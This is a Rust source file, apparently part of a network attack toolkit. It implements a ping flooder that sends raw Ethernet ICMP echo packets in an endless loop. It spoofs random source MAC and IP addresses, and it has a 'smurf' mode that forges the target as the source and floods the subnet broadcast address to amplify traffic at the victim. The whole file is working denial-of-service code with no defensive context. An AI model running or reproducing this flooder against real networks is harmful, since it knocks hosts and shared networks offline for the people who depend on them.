use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::net::Ipv4Addr;
use crate::arg_parser::PingArgs;
use crate::generators::RandValues;
use crate::iface::IfaceInfo;
use crate::pkt_builder::PacketBuilder;
use crate::sockets::Layer2RawSocket;
use crate::utils::{inline_display, get_first_and_last_ip, CtrlCHandler};



pub struct PingFlooder {
    args:       PingArgs,
    rand:       RandValues,
    builder:    PacketBuilder,
    iface:      String,
    broadcast:  Ipv4Addr,
    pkts_sent:  usize,
}



impl PingFlooder {

    pub fn new(args: PingArgs) -> Self {
        let iface = IfaceInfo::iface_name_from_ip(args.target_ip);
        let (first_ip, last_ip) = get_first_and_last_ip(&iface);

        Self {
            rand:       RandValues::new(Some(first_ip), Some(last_ip)),
            builder:    PacketBuilder::new(),
            pkts_sent:  0,
            broadcast:  Self::get_broadcast(&iface),
            iface,
            args,
        }
    }



    fn get_broadcast(iface: &str) -> Ipv4Addr {
        let (ip, prefix) = Self::get_ip_and_prefix(iface);
        let ip_u32       = u32::from(ip);
        
        let mask = if prefix == 0 { 0 } else { (!0u32) << (32 - prefix) };
        let broadcast_u32 = ip_u32 | !mask;
        Ipv4Addr::from(broadcast_u32)
    }

    
    
    fn get_ip_and_prefix(iface: &str) -> (Ipv4Addr, u8) {
        let cidr             = IfaceInfo::iface_network_cidr(iface).unwrap();
        println!("{}",cidr);
        let parts: Vec<&str> = cidr.split('/').collect();
        let ip: Ipv4Addr     = parts[0].parse().unwrap();
        let prefix: u8       = parts[1].parse().unwrap();
        (ip, prefix)
    }

    
    
    pub fn execute(&mut self){
        let l2_socket = Layer2RawSocket::new(&self.iface);
        let running   = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());

        while running.load(Ordering::SeqCst) {
            let pkt = self.get_packet();
            l2_socket.send(pkt);
            
            self.pkts_sent += 1;
            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
        }
        
        println!("\nFlood interrupted");
    }



    #[inline]
    fn get_packet(&mut self) -> &[u8] {
        let (src_mac, src_ip) = self.get_src_addrs();
        let (dst_mac, dst_ip) = self.get_dst_addrs();

        self.builder.icmp_ping_ether(
            src_mac, src_ip,
            dst_mac, dst_ip
        )
    }



    #[inline]
    fn get_src_addrs(&mut self) -> ([u8; 6], Ipv4Addr) {
        if self.args.smurf {
            return (self.args.target_mac, self.args.target_ip);
        }

        (self.rand.get_random_mac(), self.rand.get_random_ip())
    }



    #[inline]
    fn get_dst_addrs(&mut self) -> ([u8; 6], Ipv4Addr) {
        if self.args.smurf {
            return ([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF], self.broadcast);
        }

        (self.args.target_mac, self.args.target_ip)
    }

}